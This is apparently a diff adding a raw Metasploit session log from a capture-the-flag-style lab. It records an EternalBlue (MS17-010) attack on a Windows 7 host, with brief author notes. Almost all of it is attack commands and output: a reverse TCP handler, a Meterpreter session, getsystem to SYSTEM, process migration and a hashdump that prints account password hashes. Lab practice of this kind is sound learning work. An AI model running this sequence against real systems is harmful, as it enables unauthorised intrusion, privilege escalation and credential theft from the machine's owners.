@@ -1,0 +1,269 @@
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter 
+msf6 post(multi/manage/shell_to_meterpreter) > options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+
+msf6 post(multi/manage/shell_to_meterpreter) > set LHOST 10.4.27.78
+LHOST => 10.4.27.78
+msf6 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id   Name  Type               Information  Connection
+  --   ----  ----               -----------  ----------
+  1          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49208 (10.10.167.164)
+  2          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49206 (10.10.167.164)
+  3          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49207 (10.10.167.164)
+  4          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49205 (10.10.167.164)
+  5          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49209 (10.10.167.164)
+  6          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49210 (10.10.167.164)
+  7          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49211 (10.10.167.164)
+  8          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49212 (10.10.167.164)
+  9          shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49213 (10.10.167.164)
+  10         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49215 (10.10.167.164)
+  11         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49214 (10.10.167.164)
+  12         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49216 (10.10.167.164)
+  13         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49217 (10.10.167.164)
+  14         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49218 (10.10.167.164)
+  15         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49219 (10.10.167.164)
+  16         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49221 (10.10.167.164)
+  17         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49220 (10.10.167.164)
+  18         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49222 (10.10.167.164)
+  19         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49223 (10.10.167.164)
+  20         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49224 (10.10.167.164)
+  21         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49226 (10.10.167.164)
+  22         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49225 (10.10.167.164)
+  23         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49227 (10.10.167.164)
+  24         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49228 (10.10.167.164)
+  25         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49230 (10.10.167.164)
+  26         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49229 (10.10.167.164)
+  27         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49231 (10.10.167.164)
+  28         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49232 (10.10.167.164)
+  29         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49234 (10.10.167.164)
+  30         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49233 (10.10.167.164)
+  31         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49235 (10.10.167.164)
+  32         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49236 (10.10.167.164)
+  33         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49237 (10.10.167.164)
+  34         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49238 (10.10.167.164)
+  35         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49239 (10.10.167.164)
+  36         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49240 (10.10.167.164)
+  37         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49241 (10.10.167.164)
+  38         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49242 (10.10.167.164)
+  39         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49243 (10.10.167.164)
+  40         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49244 (10.10.167.164)
+  41         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49245 (10.10.167.164)
+  42         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49246 (10.10.167.164)
+  43         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49247 (10.10.167.164)
+  44         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49248 (10.10.167.164)
+  45         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49249 (10.10.167.164)
+  46         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49250 (10.10.167.164)
+  47         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49251 (10.10.167.164)
+  48         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49252 (10.10.167.164)
+  49         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49253 (10.10.167.164)
+  50         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49254 (10.10.167.164)
+  51         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49255 (10.10.167.164)
+  52         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49256 (10.10.167.164)
+  53         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49257 (10.10.167.164)
+  54         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49258 (10.10.167.164)
+  55         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49259 (10.10.167.164)
+  56         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49260 (10.10.167.164)
+  57         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49261 (10.10.167.164)
+  58         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49262 (10.10.167.164)
+  59         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49263 (10.10.167.164)
+  60         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49264 (10.10.167.164)
+  61         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49265 (10.10.167.164)
+  62         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49266 (10.10.167.164)
+  63         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49267 (10.10.167.164)
+  64         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49268 (10.10.167.164)
+  65         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49269 (10.10.167.164)
+  66         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49270 (10.10.167.164)
+  67         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49271 (10.10.167.164)
+  68         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49272 (10.10.167.164)
+  69         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49273 (10.10.167.164)
+  70         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49274 (10.10.167.164)
+  71         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49275 (10.10.167.164)
+  72         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49276 (10.10.167.164)
+  73         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49277 (10.10.167.164)
+  74         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49278 (10.10.167.164)
+  75         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49279 (10.10.167.164)
+  76         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49280 (10.10.167.164)
+  77         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49281 (10.10.167.164)
+  78         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49282 (10.10.167.164)
+  79         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49283 (10.10.167.164)
+  80         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49284 (10.10.167.164)
+  81         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49285 (10.10.167.164)
+  82         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49286 (10.10.167.164)
+  83         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49287 (10.10.167.164)
+  84         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49288 (10.10.167.164)
+  85         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49289 (10.10.167.164)
+  86         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49290 (10.10.167.164)
+  87         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49291 (10.10.167.164)
+  88         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49292 (10.10.167.164)
+  89         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49293 (10.10.167.164)
+  90         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49294 (10.10.167.164)
+  91         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49295 (10.10.167.164)
+  92         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49296 (10.10.167.164)
+  93         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49297 (10.10.167.164)
+  94         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49298 (10.10.167.164)
+  95         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49299 (10.10.167.164)
+  96         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49300 (10.10.167.164)
+  97         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49301 (10.10.167.164)
+  98         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49302 (10.10.167.164)
+  99         shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49303 (10.10.167.164)
+  100        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49304 (10.10.167.164)
+  101        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49305 (10.10.167.164)
+  102        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49306 (10.10.167.164)
+  103        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49307 (10.10.167.164)
+  104        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49308 (10.10.167.164)
+  105        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49309 (10.10.167.164)
+  106        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49310 (10.10.167.164)
+  107        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49311 (10.10.167.164)
+  108        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49312 (10.10.167.164)
+  109        shell x64/windows               10.4.27.78:4444 -> 10.10.167.164:49313 (10.10.167.164)
+
+msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
+SESSION => 1
+msf6 post(multi/manage/shell_to_meterpreter) > run
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+==>> NOTE <<==
+This doesn't convert the shell to 
+meterpreter shell 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+---------------------------------------------------------------------------------------------------------------------------
+||||||||||||||||||||||||||||||||||||||||||||||| THE OTHER METHOD ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+---------------------------------------------------------------------------------------------------------------------------
+
+By using the default payload, we can directly get the meterpreter shell when running the exploit.
+
+So most likely skipping the phase of converting shell to meterpreter.
+
+---------------------------------------------------------------------------------------------------------------------------
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+---------------------------------------------------------------------------------------------------------------------------
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.4.27.78:4444 
+[*] 10.10.66.148:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.66.148:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.66.148:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.66.148:445 - The target is vulnerable.
+[*] 10.10.66.148:445 - Connecting to target for exploitation.
+[+] 10.10.66.148:445 - Connection established for exploitation.
+[+] 10.10.66.148:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.66.148:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.66.148:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.66.148:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.66.148:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.66.148:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.66.148:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.66.148:445 - Sending all but last fragment of exploit packet
+[*] 10.10.66.148:445 - Starting non-paged pool grooming
+[+] 10.10.66.148:445 - Sending SMBv2 buffers
+[+] 10.10.66.148:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.66.148:445 - Sending final SMBv2 buffers.
+[*] 10.10.66.148:445 - Sending last fragment of exploit packet!
+[*] 10.10.66.148:445 - Receiving response from exploit packet
+[+] 10.10.66.148:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.66.148:445 - Sending egg to corrupted connection.
+[*] 10.10.66.148:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200262 bytes) to 10.10.66.148
+[*] Meterpreter session 1 opened (10.4.27.78:4444 -> 10.10.66.148:49169) at 2021-09-14 04:30:29 +0500
+[+] 10.10.66.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.66.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.66.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > getsystem 
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > shell
+Process 2560 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>^Z
+Background channel 1? [y/N]  y
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 548   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 556   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 596   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 688   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 712   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 720   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 760   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 824   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 896   688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 948   688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1016  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1080  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1160  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1308  688   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1344  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1400  688   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1488  688   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1548  824   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
+ 1604  688   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1664  824   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
+ 1720  2484  mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
+ 1884  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 2132  760   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
+ 2228  688   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
+ 2484  688   mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
+ 2520  688   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2560  1308  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
+ 2568  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 2596  688   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
+ 2632  688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2732  688   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
+ 2820  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+
+
+=-=-=-=-=-=-=-=-=-=-=
+Will be using Id 2820
+=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > migrate 2820
+[*] Migrating from 1344 to 2820...
+[*] Migration completed successfully.
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter > 
+
+
+
+
+
+
+
+
+
+
+
